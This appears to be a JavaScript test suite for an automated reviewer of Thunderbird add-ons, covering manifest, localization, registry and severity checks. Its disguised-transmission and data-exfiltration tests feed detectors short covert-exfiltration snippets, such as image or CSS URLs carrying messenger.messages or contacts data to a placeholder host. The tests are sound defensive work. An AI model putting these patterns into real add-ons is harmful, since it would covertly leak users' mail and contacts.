// ---- Tier 2 status notes (one deterministic verdict per check) ----
// These checks decide one thing about the manifest/submission; each reports its
// outcome to the feed - pass/fail, or skipped-with-reason when it does not apply
// (so a bare check header is never ambiguous). unsure = the deterministic
// decision to escalate, never the LLM's answer.
test("experiment-not-allowed notes pass / fail / skipped", () => {
  const ctxFor = (manifest, allowExperiments) => ({
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from('{\n  "experiment_apis": {}\n}\n')],
      ]),
    },
    options: { allowExperiments },
  });
  const v = (m, allow) => notesFrom(experimentNotAllowed, ctxFor(m, allow));
  assert.equal(v({ name: "x" }, false)[0].verdict, VERDICT.PASS); // not an Experiment
  assert.equal(
    v({ experiment_apis: { a: {} } }, false)[0].verdict,
    VERDICT.FAIL
  );
  assert.equal(
    v({ experiment_apis: { a: {} } }, true)[0].verdict,
    VERDICT.SKIPPED
  );
});

test("experiment-missing-strict-max-version notes pass / fail / skipped", () => {
  const v = (manifest) =>
    notesFrom(experimentMissingMax, {
      addon: { manifest },
      options: { allowExperiments: true },
    });
  assert.equal(v({ experiment_apis: { a: {} } })[0].verdict, VERDICT.FAIL); // no max
  assert.equal(
    v({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.PASS
  );
  assert.equal(v({ name: "x" })[0].verdict, VERDICT.SKIPPED); // not an Experiment
});

test("non-experiment-strict-max-version notes pass / fail / skipped", () => {
  const v = (manifest) => notesFrom(nonExperimentMax, { addon: { manifest } });
  assert.equal(v({ name: "x" })[0].verdict, VERDICT.PASS); // no max
  assert.equal(
    v({
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.FAIL
  );
  assert.equal(
    v({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    })[0].verdict,
    VERDICT.SKIPPED // an Experiment is the other check's concern
  );
});

test("strict-max-version-bump-only notes fail / pass", () => {
  const m = (max, version = "1.0") => ({
    manifest_version: 3,
    name: "x",
    version,
    browser_specific_settings: {
      gecko: { id: "a@b", strict_max_version: max },
    },
  });
  const ver = (mf, files = {}) => ({
    manifest: mf,
    files: new Map([
      ["manifest.json", Buffer.from(JSON.stringify(mf))],
      ...Object.entries(files).map(([k, v]) => [k, Buffer.from(v)]),
    ]),
  });
  const bg = "console.log(1);\n";
  const prev = ver(m("115.0"), { "bg.js": bg });
  const v = (addon, previous) =>
    notesFrom(strictMaxBumpOnly, { addon, previous });
  assert.equal(
    v(ver(m("128.0", "1.1"), { "bg.js": bg }), prev)[0].verdict,
    VERDICT.FAIL
  );
  assert.equal(
    v(ver(m("128.0", "1.1"), { "bg.js": "console.log(2);\n" }), prev)[0]
      .verdict,
    VERDICT.PASS // a code file also changed
  );
});

test("trademark-violation notes pass / fail / skipped", () => {
  const ctxFor = (name) => ({
    addon: { manifest: name == null ? {} : { name }, files: new Map() },
  });
  const v = (name) => notesFrom(trademarkViolation, ctxFor(name));
  assert.equal(v("Calendar for Thunderbird")[0].verdict, VERDICT.PASS);
  assert.equal(v("Firefox Helper")[0].verdict, VERDICT.FAIL);
  assert.equal(v(null)[0].verdict, VERDICT.SKIPPED); // no name
});

test("missing-english-localization: _locales branches (pass / fail)", () => {
  const v = (files) =>
    notesFrom(missingEnglish, {
      addon: {
        files: new Map(
          Object.entries(files).map(([k, val]) => [k, Buffer.from(val)])
        ),
      },
    });
  assert.equal(
    v({ "_locales/en/messages.json": "{}" })[0].verdict,
    VERDICT.PASS
  );
  assert.equal(
    v({ "_locales/de/messages.json": "{}" })[0].verdict,
    VERDICT.FAIL
  );
});

// No _locales: franc over the user-facing text (HTML visible text + manifest
// name/description, script/style stripped) decides. Confident non-English is a
// finding, English passes, too little/ambiguous text escalates to manual, and
// no user-facing text passes.
test("missing-english-localization: franc over hardcoded text", () => {
  const de =
    "<body><h1>Wetterbericht</h1><p>Diese Erweiterung zeigt den aktuellen " +
    "Wetterbericht und sendet Benachrichtigungen an Ihren Posteingang.</p></body>";
  const en =
    "<body><h1>Weather report</h1><p>This extension shows the current weather " +
    "forecast and sends notifications to your inbox.</p></body>";
  const run = (files, manifest) =>
    missingEnglish.run(
      withManifest({
        addon: {
          manifest,
          files: new Map(
            Object.entries(files).map(([k, val]) => [k, Buffer.from(val)])
          ),
        },
      })
    );

  const german = run({ "popup.html": de }, { name: "Wetter" });
  assert.equal(german.findings.length, 1);
  assert.equal(german.escalations.length, 0);

  const english = run({ "popup.html": en }, { name: "Weather" });
  assert.equal(english.findings.length, 0);
  assert.equal(english.escalations.length, 0);

  // Too little text: franc is unreliable, so defer to a human.
  const tiny = run({ "popup.html": "<p>Hallo Welt</p>" }, { name: "App" });
  assert.equal(tiny.findings.length, 0);
  assert.equal(tiny.escalations.length, 1);

  // No user-facing text at all -> nothing to localize.
  const empty = run({ "background.js": "console.log(1)" }, {});
  assert.equal(empty.findings.length, 0);
  assert.equal(empty.escalations.length, 0);

  // <script> text is stripped, so the German body still drives detection.
  const scripted = run(
    {
      "popup.html":
        "<body><script>const s = 'english words only inside this script';" +
        "</script><p>Vielen Dank für die Installation dieser Erweiterung in " +
        "Thunderbird.</p></body>",
    },
    {}
  );
  assert.equal(scripted.findings.length, 1);
});

// ---- yaml-driven loader ----
// Every registry entry across the deterministic and llm sections loads to a
// module with a run() function plus id/title, and ids stay in sync with checkIds.
test("every check entry (both sections) resolves to a runnable module", async () => {
  const registry = loadRegistry();
  // { eslint: true } so the eslint-gated code-sanity loads too - every entry must resolve.
  const checks = allChecks(await loadChecks(registry, { eslint: true }));
  const ids = registry.checkIds();
  assert.equal(checks.length, ids.length);
  assert.ok(checks.length >= 10);
  for (const c of checks) {
    assert.equal(typeof c.run, "function");
    assert.ok(c.title && c.id);
  }
  // The loader spans deterministic + llm checks now.
  assert.ok(ids.includes("unknown-api"));
  assert.ok(ids.includes("unused-files"));
});

// A registry pointing at a nonexistent module file fails loudly (rejects with
// /not found/) instead of silently skipping the check.
test("loadChecks throws hard when a check: names a missing module", async () => {
  const tmp = path.join(os.tmpdir(), `bad-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Bogus\n  check: __does_not_exist__.js\n"
  );
  try {
    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /not found/);
  } finally {
    fs.rmSync(tmp);
  }
});

// A post-summary-recheck producer must name a real consumer that carries a
// summary-prompt; otherwise its diverted items would be silently dropped, so the
// loader rejects the registry.
test("loadChecks rejects a dangling or prompt-less post-summary-recheck target", async () => {
  const tmp = path.join(os.tmpdir(), `recheck-registry-${process.pid}.yaml`);
  const write = (body) => fs.writeFileSync(tmp, body);
  try {
    // Target names no check at all.
    write(
      "deterministic-phase:\n- title: P\n  check: producer-x\n  post-summary-recheck: nope\n"
    );
    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /is not a check/);
    // Target is a real check, but it carries no summary-prompt.
    write(
      "deterministic-phase:\n" +
        "- title: P\n  check: producer-x\n  post-summary-recheck: consumer-x\n" +
        "- title: C\n  check: consumer-x\n"
    );
    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /summary-prompt/);
  } finally {
    fs.rmSync(tmp);
  }
});

// A check's phase IS the section it came from - never declared per entry. The recheck
// consumer lives in post-summary-phase; its producer (which declares a
// post-summary-recheck but carries no rubric) stays in the deterministic phase; and the
// reject check lives in the invalid-experiment phase.
test("a check's phase is the section it came from", async () => {
  const byPhase = await loadChecks(loadRegistry());
  const idsIn = (phase) => byPhase.get(phase).map((c) => c.id);
  assert.ok(idsIn("post-summary").includes("unused-permission-recheck"));
  assert.ok(idsIn("deterministic").includes("unused-permission"));
  assert.ok(idsIn("invalid-experiment").includes("experiment-not-allowed"));
  // ...and the reject check is in NO other phase - it only runs when short-circuiting.
  assert.ok(!idsIn("deterministic").includes("experiment-not-allowed"));
});

// ONE rule module = ONE entry = ONE phase. A check's id IS its module's filename stem, so a
// second entry naming the same module is the SAME check declared twice: it runs once per
// entry, and the id -> entry Map (how every finding reaches its severity and response) keeps
// only the LAST - so a duplicate can silently restamp a real check's severity.
test("loadRegistry rejects a check declared in two phases", () => {
  const tmp = path.join(os.tmpdir(), `dup-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n" +
      "- title: Sync XHR\n  severity: warning\n  check: sync-xhr\n  input: source\n" +
      "llm-phase:\n" +
      "- title: Sync XHR again\n  severity: info\n  check: sync-xhr\n  input: source\n"
  );
  try {
    assert.throws(
      () => loadRegistry(tmp),
      /"sync-xhr" is declared more than once/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// The phase sections ARE the control flow: runChecks looks each one up BY NAME. So renaming
// or misspelling one in registry.yaml would not fail loudly - it would yield an empty phase,
// and the review would silently run without every llm check, or without every recheck
// consumer. loadRegistry asserts the shipped registry declares all four; this pins that no
// phase can quietly become empty (a typo makes loadRegistry throw, and this test fail).
test("every phase of the shipped registry is declared and populated", async () => {
  const byPhase = await loadChecks(loadRegistry());
  for (const phase of [
    "invalid-experiment",
    "deterministic",
    "llm",
    "post-summary",
  ]) {
    assert.ok(
      (byPhase.get(phase) ?? []).length > 0,
      `phase "${phase}" loaded no checks - its registry.yaml section is missing or renamed`
    );
  }
});

// The guard behind the above: a required phase section that is missing or empty in the yaml
// (a rename, a bad edit) is a defect that would silently drop that whole phase from every
// review. assertRequiredPhaseSections turns it into a loud abort. Tested directly, because in
// loadRegistry it runs for the SHIPPED registry only (a partial test yaml must not trip it).
test("assertRequiredPhaseSections rejects a missing or empty required phase section", () => {
  const full = {
    "invalid-experiment-phase": [{ check: "experiment-not-allowed" }],
    "deterministic-phase": [{ check: "sync-xhr" }],
    "llm-phase": [{ check: "data-exfiltration" }],
    "post-summary-phase": [{ check: "unused-files-recheck" }],
  };
  // The complete set is accepted.
  assert.doesNotThrow(() => assertRequiredPhaseSections(full, "ok.yaml"));
  // A section removed entirely (a rename) throws, naming the missing one.
  const { "llm-phase": _dropped, ...missing } = full;
  assert.throws(
    () => assertRequiredPhaseSections(missing, "x.yaml"),
    /phase section "llm-phase" is missing or empty/
  );
  // A section present but empty throws too.
  assert.throws(
    () =>
      assertRequiredPhaseSections(
        { ...full, "deterministic-phase": [] },
        "x.yaml"
      ),
    /phase section "deterministic-phase" is missing or empty/
  );
});

// loadChecks validates the severity token: error/warning/info/auto are allowed,
// anything else is a loud config error (the module exists; only the severity is
// bad - so this is distinct from the missing-module failure above).
test("loadChecks accepts severity: auto", async () => {
  const tmp = path.join(os.tmpdir(), `auto-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Ok\n  severity: auto\n  check: sync-xhr.js\n  input: source\n"
  );
  try {
    const checks = allChecks(await loadChecks(loadRegistry(tmp)));
    assert.equal(checks[0].severity, "auto");
  } finally {
    fs.rmSync(tmp);
  }
});

// loadChecks requires a valid `input` on every check (source | xpi) - it drives
// runOneCheck's artifact routing, so a missing/invalid value is a loud config error
// (no default to silently fall through to).
test("loadChecks rejects a check with no valid input", async () => {
  const tmp = path.join(os.tmpdir(), `bad-input-registry-${process.pid}.yaml`);
  // Valid severity so the input check (which runs after severity) is what fires.
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: NoInput\n  severity: error\n  check: sync-xhr.js\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /missing a valid `input`/
    );
    // An out-of-set value is rejected too.
    fs.writeFileSync(
      tmp,
      "deterministic-phase:\n- title: BadInput\n  severity: error\n  check: sync-xhr.js\n  input: bogus\n"
    );
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /missing a valid `input`/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// An `input: build` check reads the SCA-only build corpus, so it MUST be `sca: true` - else it
// runs in an XPI review too, where the build sibling is undefined and routeCtx silently routes
// it to the review target. The gate is the only guard, so loadChecks asserts it.
test("loadChecks rejects an input:build check that is not sca:true", async () => {
  const tmp = path.join(
    os.tmpdir(),
    `build-nosca-registry-${process.pid}.yaml`
  );
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Build\n  severity: error\n  check: sync-xhr.js\n  input: build\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /`input: build` but not `sca: true`/
    );
    // With the gate, it loads.
    fs.writeFileSync(
      tmp,
      "deterministic-phase:\n- title: Build\n  severity: error\n  check: sync-xhr.js\n  input: build\n  sca: true\n"
    );
    const checks = allChecks(await loadChecks(loadRegistry(tmp)));
    assert.equal(checks[0].input, "build");
  } finally {
    fs.rmSync(tmp);
  }
});

test("loadChecks rejects an invalid severity token", async () => {
  const tmp = path.join(os.tmpdir(), `bad-sev-registry-${process.pid}.yaml`);
  fs.writeFileSync(
    tmp,
    "deterministic-phase:\n- title: Bad\n  severity: nope\n  check: sync-xhr.js\n"
  );
  try {
    await assert.rejects(
      () => loadChecks(loadRegistry(tmp)),
      /invalid severity "nope"/
    );
  } finally {
    fs.rmSync(tmp);
  }
});

// ---- severity stamping (the orchestrator is the gatekeeper) ----
// A check under a FIXED registry severity cannot choose its own: any f.severity
// it sets is overwritten with the entry's. Only severity:auto delegates the
// choice to the check - and even then a missing/invalid value fails safe to
// error, so a finding never leaves runOneCheck without a concrete severity.
test("a fixed-severity check cannot override its finding severity", async () => {
  const check = {
    id: "fixed",
    severity: "warning",
    run: () => [finding({ item: "x", severity: "error" })],
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.equal(out.findings.length, 1);
  assert.equal(out.findings[0].severity, "warning"); // entry wins; check ignored
});

test("severity:auto lets the check set each finding's severity", async () => {
  const check = {
    id: "auto",
    severity: "auto",
    run: () => [
      finding({ item: "a", severity: "warning" }),
      finding({ item: "b", severity: "info" }),
    ],
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.deepEqual(
    out.findings.map((f) => f.severity),
    ["warning", "info"]
  );
});

test("severity:auto fails safe to error when the check sets none/invalid", async () => {
  const check = {
    id: "auto-bad",
    severity: "auto",
    run: () => [
      finding({ item: "a" }), // no severity
      finding({ item: "b", severity: "auto" }), // not a concrete severity
    ],
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.deepEqual(
    out.findings.map((f) => f.severity),
    ["error", "error"]
  );
});

test("a throwing check is caught and turned into a check-failed error", async () => {
  const check = {
    id: "boom-check",
    severity: "info", // ignored: the catch stamps ERROR regardless
    run: () => {
      throw new Error("boom");
    },
  };
  const out = await runOneCheck({}, check, "[1/1]");
  assert.equal(out.findings.length, 1);
  assert.equal(out.findings[0].ruleId, "check-failed");
  assert.equal(out.findings[0].severity, SEVERITY.ERROR);
  assert.equal(out.findings[0].item, "boom-check");
});

// ---- disguised-transmission (covert) + data-exfiltration (overt) ----
// Covert channels (data appended to an image/CSS/resource URL) are a flat
// error; a normal fetch to a remote host escalates for an options-page consent
// check. Local destinations and data-free covert loads are ignored.
test("disguised-* hard-flag the STRONG covert case (a user-data API in the URL)", () => {
  const res = (code) => disguisedResource.run(withManifest(jsCtx(code))).length;
  const sty = (code) =>
    disguisedStylesheet.run(withManifest(jsCtx(code))).length;
  // A user-data API call inside the covert URL -> provably user data -> hard error.
  assert.equal(
    res('img.src = "https://x/?d=" + messenger.messages.list();'),
    1
  );
  assert.equal(
    sty(
      'el.style.backgroundImage = "url(https://x/?d=" + messenger.contacts.list() + ")";'
    ),
    1
  );
  // A merely-appended runtime value (no user-data API) is the WEAK case - NOT a
  // hard finding here (it goes to disguised-transmission, asserted below).
  assert.equal(res('img.src = "https://x/?d=" + body;'), 0);
  assert.equal(res('img.src = "./logo.png";'), 0); // local
  assert.equal(res('img.src = "https://x/logo.png";'), 0); // static, no data
});

test("disguised-transmission takes the WEAK covert case as an LLM candidate", () => {
  const cands = (code) => {
    const out = disguisedTransmission.run(withManifest(jsCtx(code)));
    return out.llm ? out.llm.candidates.length : 0;
  };
  assert.equal(cands('img.src = "https://x/?d=" + body;'), 1); // appended-only
  assert.equal(
    cands('window.location.href = "https://x/" + team + "/inbox";'),
    1
  ); // navigation, appended-only (the birdbox shape)
  // The strong case stays with the hard disguised-* checks, not here.
  assert.equal(
    cands('img.src = "https://x/?d=" + messenger.messages.list();'),
    0
  );
  assert.equal(cands('img.src = "https://x/logo.png";'), 0); // static, no data
  assert.equal(cands('fetch("https://x/?d=" + body);'), 0); // overt, not covert
});

test("data-exfiltration makes a candidate per overt remote transmission only", () => {
  const candidates = (code) => {
    const out = dataExfiltration.run(withManifest(jsCtx(code)));
    return out.llm ? out.llm.candidates.length : 0;
  };
  assert.equal(candidates('fetch("https://api.example.com/", { body });'), 1);
  assert.equal(candidates('navigator.sendBeacon("https://x", d);'), 1);
  assert.equal(candidates('fetch("./local.json");'), 0); // local
  assert.equal(candidates('img.src = "https://x/?d=" + body;'), 0); // covert
});

// The transmission method rides on the finding's `hint` (shown on the locus),
// while `item` stays absent so the recheck key stays the unique file:line.
test("data-exfiltration labels each locus with the transmission method", () => {
  const out = dataExfiltration.run(
    withManifest(jsCtx('fetch("https://api.example.com/", { body });'))
  );
  const { findings } = out.llm.resolve(
    new Map([["X1", { verdict: VERDICT.FAIL }]])
  );
  assert.equal(findings.length, 1);
  assert.equal(findings[0].hint, "fetch()");
  assert.equal(findings[0].item, null);
});

test("scanNetworkSinks classifies channel, destination, appended data", () => {
  const one = (code) => scanNetworkSinks(code).hits[0];
  const img = one('img.src = "https://x/?d=" + v;');
  assert.equal(img.type, "element-src");
  assert.equal(img.channel, CHANNEL.COVERT);
  assert.equal(img.destClass, URL_CLASS.REMOTE);
  assert.equal(img.dataAppended, true);
  const beacon = one('navigator.sendBeacon("https://x", d);');
  assert.equal(beacon.channel, CHANNEL.OVERT);
  assert.equal(beacon.destClass, URL_CLASS.REMOTE);
  assert.equal(
    one("fetch(u, { body: messenger.messages.getFull(id) });").carriesData,
    true
  );
});

// carriesData resolves the payload's chain base through the shared api-base
// index: a whole-object alias and a captured data-API namespace (the API is the
// capture's prefix) count as user data; a shadowed local named like a root does
// not.
test("scanNetworkSinks carriesData follows aliases and captured namespaces", () => {
  const one = (code) => scanNetworkSinks(code).hits[0];
  assert.equal(
    one(
      `const api = messenger || browser;
       fetch(u, { body: api.messages.getFull(id) });`
    ).carriesData,
    true
  );
  assert.equal(
    one(
      `const m = messenger.messages;
       fetch(u, { body: m.getFull(id) });`
    ).carriesData,
    true
  );
  assert.equal(
    one(
      `function f(messenger) {
         fetch(u, { body: messenger.messages.getFull(id) });
       }`
    ).carriesData,
    false
  );
});

// ---- cleartext-transmission ----
// Any overt transmission to a remote host over a non-TLS scheme is an error,
// with or without a payload; encrypted (https/wss) and local destinations are
// fine, and covert channels are disguised-transmission's job.
test("cleartext-transmission flags overt http/ws/ftp remote sends only", () => {
  const n = (code) =>
    cleartextTransmission.run(withManifest(jsCtx(code))).length;
  assert.equal(n('fetch("http://api.example.com/x");'), 1); // GET, no payload
  assert.equal(n('new WebSocket("ws://x.example.com/feed");'), 1);
  assert.equal(n('fetch("ftp://files.example.com/x");'), 1);
  assert.equal(n('fetch("https://api.example.com/x");'), 0); // encrypted
  assert.equal(n('new WebSocket("wss://x.example.com/feed");'), 0); // encrypted
  assert.equal(n('fetch("/local.json");'), 0); // local
  assert.equal(n('img.src = "http://x/?d=" + body;'), 0); // covert, not overt
  const hit = cleartextTransmission.run(
    withManifest(jsCtx('fetch("http://api.example.com/x");'))
  )[0];
  assert.equal(hit.item, "api.example.com");
});

// ---- privacy-policy ----
// One manual-review escalation per distinct remote host of every overt
// transmission (the hosts list as the "where"); covert and local destinations
// do not trigger it.
test("privacy-policy escalates one entry per distinct remote host", () => {
  const esc = (code) =>
    privacyPolicy.run(withManifest(jsCtx(code))).escalations;
  const single = esc('fetch("https://api.example.com/x");');
  assert.equal(single.length, 1);
  assert.equal(single[0].item, "api.example.com");
  const two = esc(
    'fetch("https://b.example.com/x"); fetch("https://a.example.com/y");'
  );
  assert.deepEqual(
    two.map((e) => e.item),
    ["a.example.com", "b.example.com"] // one per distinct host, sorted
  );
  assert.equal(esc('fetch("./local.json");').length, 0); // local
  assert.equal(esc('img.src = "https://x/?d=" + body;').length, 0); // covert
});

// ---- native-messaging ----
// Keyed purely on the declared permission (required or optional); no JS scan.
test("native-messaging escalates on the declared permission", () => {
  const esc = (manifest) =>
    nativeMessaging.run(withManifest({ addon: { manifest } })).escalations;
  const declared = esc({ permissions: ["nativeMessaging"] });
  assert.equal(declared.length, 1);
  // A single whole-add-on reminder: no item to list (instructions name it).
  assert.equal(declared[0].item, undefined);
  assert.equal(esc({ optional_permissions: ["nativeMessaging"] }).length, 1);
  assert.equal(esc({ permissions: ["storage"] }).length, 0);
  assert.equal(esc({}).length, 0);
  assert.equal(
    nativeMessaging.run(withManifest({ addon: {} })).escalations.length,
    0
  );
});

// ---- default-locale-missing / default-locale-unused ----
// A _locales directory requires a default_locale key and vice versa; either one
// alone breaks loading. The two checks split the two directions.
test("default-locale checks flag the two load-breaking directions", () => {
  const ctx = (files, manifest) => ({
    addon: {
      files: new Map(
        Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
      ),
      manifest,
    },
  });
  const locales = { "_locales/en/messages.json": "{}" };
  // missing: _locales present, no default_locale.
  assert.equal(
    defaultLocaleMissing.run(withManifest(ctx(locales, {}))).length,
    1
  );
  assert.equal(
    defaultLocaleMissing.run(
      withManifest(ctx(locales, { default_locale: "en" }))
    ).length,
    0
  );
  assert.equal(defaultLocaleMissing.run(withManifest(ctx({}, {}))).length, 0);
  // unused: default_locale set, no _locales.
  assert.equal(
    defaultLocaleUnused.run(withManifest(ctx({}, { default_locale: "en" })))
      .length,
    1
  );
  assert.equal(
    defaultLocaleUnused.run(
      withManifest(ctx(locales, { default_locale: "en" }))
    ).length,
    0
  );
  assert.equal(defaultLocaleUnused.run(withManifest(ctx({}, {}))).length, 0);
});

// ---- addon-icon-missing ----
// No defined add-on icon (absent `icons`, empty/blank values, or a malformed
// non-object) gets one advisory with no location; a declared icon passes; themes
// and dictionaries are exempt; an unparsed manifest is skipped.
test("addon-icon-missing flags an extension with no defined add-on icon", () => {
  const ctx = (manifest) => ({ addon: { manifest } });
  const out = addonIconMissing.run(
    withManifest(ctx({ manifest_version: 3, name: "x" }))
  );
  assert.equal(out.length, 1);
  assert.equal(out[0].file, "manifest.json");
  assert.equal(out[0].loc, null);
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: { 16: "icon-16.png" } })))
      .length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: {} }))).length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: { 16: "  " } }))).length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ icons: "icon.png" }))).length,
    1
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ theme: { colors: {} } }))).length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest(ctx({ dictionaries: { en: "x.dic" } })))
      .length,
    0
  );
  assert.equal(
    addonIconMissing.run(withManifest({ addon: { manifest: null } })).length,
    0
  );
});

// ---- unrecognized-manifest-key ----
// An unknown top-level key is flagged, but a key that names an experiment_apis
// entry is experiment-owned config the add-on reads - accepted, not flagged.
test("unrecognized-manifest-key accepts experiment-owned keys", () => {
  const run = (manifest) =>
    unrecognizedManifestKey.run(
      withManifest({
        addon: {
          manifest,
          files: new Map([
            ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
          ]),
        },
        schema: { validManifestKeys: new Set(["name", "experiment_apis"]) },
      })
    );
  const out = run({
    name: "x",
    experiment_apis: { calendar_provider: {} },
    calendar_provider: { capabilities: {} }, // owned by the experiment
    bogusKey: 1, // genuinely unknown
  });
  const items = out.map((f) => f.item);
  assert.ok(!items.includes("calendar_provider")); // experiment-owned -> accepted
  assert.ok(items.includes("bogusKey")); // still flagged
});

// The other experiment-owned exemption: a key an experiment's bundled SCHEMA declares
// (a `manifest` namespace $extend of WebExtensionManifest). The schema PATH resolves
// against ctx.addon.files - the built XPI for this `input: xpi` check, where the built
// path exists. Regression guard for the SCA false positive: as `input: source` the check
// ran over the readable source, the built schema path was absent there, the exemption
// silently returned nothing, and a legitimate experiment key (e.g. calendar_item_action)
// was flagged. Routing it to the XPI (registry `input: xpi`) restores the pairing.
test("unrecognized-manifest-key accepts a key declared by an experiment's bundled schema", () => {
  const manifest = {
    name: "x",
    experiment_apis: { calendar: { schema: "experiments/cal/schema.json" } },
    calendar_item_action: { title: "Do" }, // declared by the schema below
    bogusKey: 1, // genuinely unknown
  };
  const schema = [
    {
      namespace: "manifest",
      types: [
        {
          $extend: "WebExtensionManifest",
          properties: { calendar_item_action: { type: "object" } },
        },
      ],
    },
  ];
  const out = unrecognizedManifestKey.run(
    withManifest({
      addon: {
        manifest,
        files: new Map([
          ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
          ["experiments/cal/schema.json", Buffer.from(JSON.stringify(schema))],
        ]),
      },
      schema: { validManifestKeys: new Set(["name", "experiment_apis"]) },
    })
  );
  const items = out.map((f) => f.item);
  assert.ok(!items.includes("calendar_item_action")); // schema-declared -> accepted
  assert.ok(items.includes("bogusKey")); // still flagged
});

// ---- background-module ----
// A background script using static import/export needs the background declared
// "type": "module"; module syntax in a non-background file is ignored.
test("background-module flags module syntax without type: module", () => {
  const n = (code, background) =>
    backgroundModule.run(withManifest(jsCtx(code, { background }))).length;
  assert.equal(n('import x from "./y.js";', { scripts: ["f.js"] }), 1);
  assert.equal(n("export const a = 1;", { scripts: ["f.js"] }), 1);
  assert.equal(
    n('import x from "./y.js";', { scripts: ["f.js"], type: "module" }),
    0
  );
  assert.equal(n("console.log(1);", { scripts: ["f.js"] }), 0);
  assert.equal(n('import x from "./y.js";', { scripts: ["other.js"] }), 0);
});

// unrecognized-file-type: the backstop for the JS-corpus suffix list. reachability's
// manifest walk and <script> walk record any LIVE referenced packaged file whose suffix is
// not in RECOGNIZED_EXTS (a file the browser loads but no check could classify); the check
// reports them. input: xpi. A helper builds a routed-to-the-artifact ctx with reachability
// inputs (files + shipped manifest + parsed sources).
const reachCtx = (files, manifest) => {
  const addon = {
    files: new Map(
      Object.entries({
        "manifest.json": JSON.stringify(manifest),
        ...files,
      }).map(([k, v]) => [k, Buffer.from(v)])
    ),
    manifest,
  };
  return withManifest({
    addon,
    jsSources: parsedSources(addon),
    mode: REVIEW_MODE.XPI,
    options: {},
  });
};
const urtFiles = (ctx) =>
  unrecognizedFileType
    .run(ctx)
    .map((f) => f.file)
    .sort();

test("unrecognized-file-type flags a manifest-declared script with an unknown suffix", () => {
  const ctx = reachCtx(
    { "bg.weird": "globalThis.x = 1;" },
    { manifest_version: 3, background: { scripts: ["bg.weird"] } }
  );
  assert.deepEqual(urtFiles(ctx), ["bg.weird"]);
});

// The <script> walk classifies against JS_EXTENSIONS, not RECOGNIZED_EXTS: a <script src>
// loads its target AS CODE whatever the extension, so BOTH an unrecognized suffix (.weird)
// and a recognized-but-non-JS suffix (.txt executed as a script) are flagged - the latter is
// exactly the evasion of hiding JS behind a resource extension.
test("unrecognized-file-type flags a <script src> that is not JS (unknown OR recognized-non-JS)", () => {
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "page.html":
        '<html><body><script src="logic.data"></script><script src="mod.txt"></script><script src="ok.js"></script></body></html>',
      "logic.data": "globalThis.y = 2;",
      "mod.txt": "export const b = 2;",
      "ok.js": "globalThis.z = 3;",
    },
    {
      manifest_version: 3,
      background: { scripts: ["bg.js"] },
      // page.html is a live entry point (an options page), so its <script src> runs.
      options_ui: { page: "page.html" },
    }
  );
  // logic.data + mod.txt flagged (loaded as code, not JS); ok.js is JS, not flagged.
  assert.deepEqual(urtFiles(ctx), ["logic.data", "mod.txt"]);
});

test("unrecognized-file-type does NOT flag recognized resource types", () => {
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "icon.png": "PNG",
      "_locales/en/messages.json": "{}",
      "font.woff2": "FONT",
    },
    {
      manifest_version: 3,
      default_locale: "en",
      background: { scripts: ["bg.js"] },
      icons: { 48: "icon.png" },
    }
  );
  assert.deepEqual(urtFiles(ctx), []);
});

test("unrecognized-file-type does NOT flag a script in a DEAD (unreachable) page", () => {
  // dead.html is referenced by nothing, so it never loads - its <script src> never runs.
  const ctx = reachCtx(
    {
      "bg.js": "globalThis.x = 1;",
      "dead.html": '<html><body><script src="x.data"></script></body></html>',
      "x.data": "globalThis.y = 2;",
    },
    { manifest_version: 3, background: { scripts: ["bg.js"] } }
  );
  assert.deepEqual(urtFiles(ctx), []);
});
